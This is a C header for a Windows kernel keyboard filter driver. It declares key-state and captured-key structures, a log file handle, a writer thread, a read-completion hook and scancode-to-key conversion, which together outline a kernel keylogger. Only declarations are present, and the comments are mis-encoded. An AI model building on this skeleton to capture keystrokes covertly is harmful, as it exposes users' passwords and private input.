#include <ntddk.h>
#include <ntddkbd.h>

typedef struct 
{
	BOOLEAN shift;
	BOOLEAN capslock;
	BOOLEAN ctrl;
	BOOLEAN alt;
} KEY_STATE;

//??? 
typedef struct 
{
	LIST_ENTRY listNode;
	char keyData;
	char keyFlags;
} KEY_DATA;



typedef struct _DEVICE_EXTENSION
{
	PDEVICE_OBJECT pKeyboardDevice; //��������� �� ����. ����������
	PETHREAD pThreadObj;
	BOOLEAN bClosedThread;
	HANDLE hLog;
	KEY_STATE kState;
	KSEMAPHORE semaphore;
	KSPIN_LOCK spinlock;
	LIST_ENTRY listHead;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

/*
//��������� ������������� ������� �������
typedef struct _KEYBOARD_INPUT_DATA {
	USHORT unitId;
	USHORT makeCode;
	USHORT flags;
	USHORT reserved;
	ULONG extraInf;
} KEYBOARD_INPUT_DATA, *PKEYBOARD_INPUT_DATA;
*/

NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context);

NTSTATUS DispatchSkip(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);

//��������� �������� �� ������
NTSTATUS DispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);


//������� �������� ��������
VOID Unload(PDRIVER_OBJECT pDriverObject);

//��������� �������
NTSTATUS InitializeKeyboardFilter(PDRIVER_OBJECT pDriverObject);

VOID ThreadForWriting(PVOID pContext);

//������� ������������� ������
NTSTATUS InitializeThread(PDRIVER_OBJECT pDriverObject);

char* Scancode2Key(PDEVICE_EXTENSION pDeviceExtension, KEY_DATA* kData, char* keys);

NTSTATUS CreateFile(PDRIVER_OBJECT pDriverObject);


//������� �����
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);

